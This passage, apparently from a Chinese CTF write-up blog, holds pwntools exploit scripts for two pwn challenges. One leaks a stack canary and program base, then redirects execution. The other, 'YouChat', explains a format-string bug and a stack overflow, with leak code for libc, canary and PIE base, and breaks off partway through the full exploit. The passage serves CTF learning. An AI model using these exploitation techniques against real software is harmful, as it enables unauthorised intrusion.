class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./a.out1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x158C)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sa(<span class="string">&quot;给我一个出路&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_num</span>(<span class="params">num1,num2</span>):</span></span><br><span class="line">    re = num1 - num2</span><br><span class="line">    <span class="keyword">while</span> re &lt; <span class="number">0</span>:</span><br><span class="line">        re += <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_num</span>(<span class="params">num1,num2</span>):</span></span><br><span class="line">    re = num1 + num2</span><br><span class="line">    <span class="keyword">while</span> re &gt; <span class="number">0x100</span>:</span><br><span class="line">        re -= <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,offset,canary=<span class="number">0</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;number:&quot;</span>,<span class="built_in">str</span>(size+offset))</span><br><span class="line">    <span class="keyword">if</span> canary==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x108</span>):</span><br><span class="line">            sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            sl(<span class="built_in">str</span>((canary&gt;&gt;(<span class="number">8</span>*i))&amp; <span class="number">0xff</span>))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">0x110</span>):</span><br><span class="line">            sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(offset):</span><br><span class="line">        sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;result is &quot;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">data,canary</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;number:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x118</span>+<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x108</span>):</span><br><span class="line">        sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sl(<span class="built_in">str</span>((canary&gt;&gt;(<span class="number">8</span>*i))&amp; <span class="number">0xff</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        sl(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_target</span>(<span class="params">offset,canary=<span class="number">0</span></span>):</span></span><br><span class="line">    leak = <span class="number">0</span></span><br><span class="line">    leakt = <span class="number">0</span></span><br><span class="line">    canary_offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(canary!=<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            canary_offset += canary&gt;&gt;(<span class="number">8</span>*i) &amp; <span class="number">0xff</span></span><br><span class="line">        canary_offset = canary_offset &amp; <span class="number">0xff</span></span><br><span class="line">    success(<span class="string">&quot;canary_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary_offset))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">1</span>,canary)</span><br><span class="line">    leakt = leak_addr1</span><br><span class="line">    leakt = sub_num(leakt,canary_offset)</span><br><span class="line">    leak += leakt*<span class="number">0x1</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line">   </span><br><span class="line">    leak_addr2 = add(offset,<span class="number">2</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x100</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">3</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr1,leak_addr2)</span><br><span class="line">    leak += leakt*<span class="number">0x10000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr2 = add(offset,<span class="number">4</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x1000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">5</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr1,leak_addr2)</span><br><span class="line">    leak += leakt*<span class="number">0x100000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr2 = add(offset,<span class="number">6</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x10000000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr1 = add(offset,<span class="number">7</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr1,leak_addr2)</span><br><span class="line">    leak += leakt*<span class="number">0x1000000000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    leak_addr2 = add(offset,<span class="number">8</span>,canary)</span><br><span class="line">    leakt = sub_num(leak_addr2,leak_addr1)</span><br><span class="line">    leak += leakt*<span class="number">0x100000000000000</span></span><br><span class="line">    success(<span class="string">&quot;leak_part &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakt))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">leak_addr = leak_target(<span class="number">0x108</span>)</span><br><span class="line">canary = leak_addr</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">leak_addr = leak_target(<span class="number">0x118</span>,canary)</span><br><span class="line">pro_base = leak_addr - <span class="number">0x19a3</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = pro_base + <span class="number">0x0000000000001a73</span></span><br><span class="line">pop_rsi_r15_ret = pro_base + <span class="number">0x0000000000001a71</span></span><br><span class="line">scanf_plt = pro_base + <span class="number">0x1160</span></span><br><span class="line">key_addr = pro_base + <span class="number">0x404C</span></span><br><span class="line">d_addr = pro_base + <span class="number">0x20C9</span></span><br><span class="line">door_addr = pro_base + <span class="number">0x12BA</span></span><br><span class="line"></span><br><span class="line">payload =  p64(door_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">edit(payload,canary)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="YouChat"><a href="#YouChat" class="headerlink" title="YouChat"></a>YouChat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.12</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">YouChat: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d476e7cd0be2b555624f5111dedddeb8640df8f7, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;[+] Successfully set a new status: &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
<p>栈溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Message:  &quot;</span>);</span><br><span class="line">len = read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>需要先进行两个匹配进入核心功能：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;Username:&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;Password:&quot;</span>,passwd)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;Username:&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;Password:&quot;</span>,passwd)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">register(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">register(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">register(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">login(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>利用格式化字符串漏洞可以泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>(<span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;new status: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x4aa429</span> + <span class="number">729088</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>利用栈溢出覆盖 canary 低位可以泄露出 canary：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">choose(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">send(<span class="string">&quot;a&quot;</span>*<span class="number">0x200</span>+<span class="string">&quot;b&quot;</span>*<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;b&quot;</span>*<span class="number">9</span>)</span><br><span class="line">leak_addr = (ru(<span class="string">&quot;is&quot;</span>)[:<span class="number">7</span>])</span><br><span class="line">leak_addr = u64(leak_addr.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">canary = leak_addr * <span class="number">0x100</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
<p>覆盖 canary 后可以泄露其后的返回地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x200</span>+<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+<span class="string">&quot;c&quot;</span>*<span class="number">8</span></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;c&quot;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">leak_addr = u64(leak_addr.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0xb080</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+hex(pro_base))</span><br></pre></td></tr></table></figure>
<p>最后执行一个 execve 就可以了</p>
<p>完整 exp 如下：（比赛时不知道本地和远程有 729088 字节的偏移，浪费了很长时间）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./YouChat.patch&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.22.2.66&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x31D2)\nb *$rebase(0x3811)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;Username:&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;Password:&quot;</span>,passwd)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">name,passwd</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;Username:&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;Password:&quot;</span>,passwd)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">contact</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;contact:&quot;</span>,contact)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;Username:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;choice&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">status</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice&quot;</span>,<span 